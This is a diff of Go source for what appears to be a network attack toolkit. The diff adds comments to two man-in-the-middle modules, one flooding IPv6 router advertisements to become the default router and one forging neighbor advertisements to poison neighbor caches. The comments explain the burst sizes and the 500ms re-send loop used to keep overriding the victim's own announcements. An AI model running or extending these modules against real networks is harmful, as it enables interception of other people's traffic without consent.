@@ -10,6 +10,8 @@ import (
 	"github.com/qyvora/toha3ee/internal/safety"
 )
 
+// init registers the IPv6 Router Advertisement and Neighbor Advertisement
+// poisoning modules.
 func init() {
 	attacks.Register(&IPv6RouterAdv{})
 	attacks.Register(&IPv6NeighborAdv{})
@@ -20,13 +22,14 @@ func init() {
 // through the attacker.
 type IPv6RouterAdv struct{}
 
-// Meta implements attacks.Module.
+// Meta implements attacks.Module, returning the module's registry descriptor.
 func (*IPv6RouterAdv) Meta() attacks.ModuleMeta {
 	return attacks.ModuleMeta{
-		ID:          "ipv6.ra",
-		Category:    "mitm",
-		Risk:        attacks.RiskHigh,
-		Targets:     []string{"gateway", "host"},
+		ID:       "ipv6.ra",
+		Category: "mitm",
+		Risk:     attacks.RiskHigh,
+		Targets:  []string{"gateway", "host"},
+		// Forged RAs need raw IPv6 sockets to inject NDP frames on the link.
 		Requires:    []string{"cap.ipv6", "cap.raw_socket"},
 		Description: "IPv6 router advertisement flood: become the default router on the link to capture IPv6 traffic",
 		Limitations: "only affects IPv6 clients; RA-guard on the switch port and source-address-filtering drop these frames",
@@ -46,6 +49,9 @@ func (*IPv6RouterAdv) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightRepor
 		return rep, nil
 	}
 	rep.AddOK("iface", ctx.Iface.String())
+	// An RA can still be sent without a source IPv6 address (the sender is
+	// identified by its MAC), but the advertised router is more convincing
+	// with a real address, so this is only a warning, not a blocker.
 	if ctx.Iface.IPv6 == nil {
 		rep.AddFixable("ipv6", "interface has no IPv6 address; RA will still advertise this MAC as a router")
 	} else {
@@ -77,6 +83,9 @@ func (*IPv6RouterAdv) Run(ctx *attacks.AttackCtx, opts map[string]string) error 
 			return nil
 		default:
 		}
+		// RouterAdvertisement bursts several RAs (10) to maximize the chance
+		// every client on the link accepts one before its stale default route
+		// expires.
 		n, err := s.RouterAdvertisement(ctx.Iface.IPv6, ctx.Iface.MAC, 10)
 		if err != nil {
 			ctx.Printf("[!] ipv6.ra: %v\n", err)
@@ -115,7 +124,7 @@ func (*IPv6RouterAdv) Cleanup(ctx *attacks.AttackCtx) error {
 // the victim's IP as belonging to this host (the IPv6 twin of ARP poisoning).
 type IPv6NeighborAdv struct{}
 
-// Meta implements attacks.Module.
+// Meta implements attacks.Module, returning the module's registry descriptor.
 func (*IPv6NeighborAdv) Meta() attacks.ModuleMeta {
 	return attacks.ModuleMeta{
 		ID:          "ipv6.ndp",
@@ -141,6 +150,8 @@ func (*IPv6NeighborAdv) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightRep
 		return rep, nil
 	}
 	rep.AddOK("iface", ctx.Iface.String())
+	// The forged NA needs a believable source address; without an IPv6 address
+	// the advertisement cannot be sent, hence a hard block.
 	if ctx.Iface.IPv6 == nil {
 		rep.AddBlocked("ipv6", "interface has no IPv6 source address")
 	}
@@ -184,6 +195,10 @@ func (*IPv6NeighborAdv) Run(ctx *attacks.AttackCtx, opts map[string]string) erro
 			return nil
 		default:
 		}
+		// Each burst claims the victim's address as ours several times (5) so
+		// any neighbor cache that receives the frame is overwritten; the loop
+		// re-sends every 500ms because the real victim periodically re-announces
+		// its own address (a race we must keep winning).
 		n, err := s.NeighborAdvertisement(ctx.Iface.IPv6, ctx.Iface.MAC, victim, 5)
 		if err != nil {
 			ctx.Printf("[!] ipv6.ndp: %v\n", err)
@@ -218,5 +233,6 @@ func (*IPv6NeighborAdv) Cleanup(ctx *attacks.AttackCtx) error {
 	return nil
 }
 
+// Compile-time assertions that both IPv6 modules implement attacks.Module.
 var _ attacks.Module = (*IPv6RouterAdv)(nil)
 var _ attacks.Module = (*IPv6NeighborAdv)(nil)
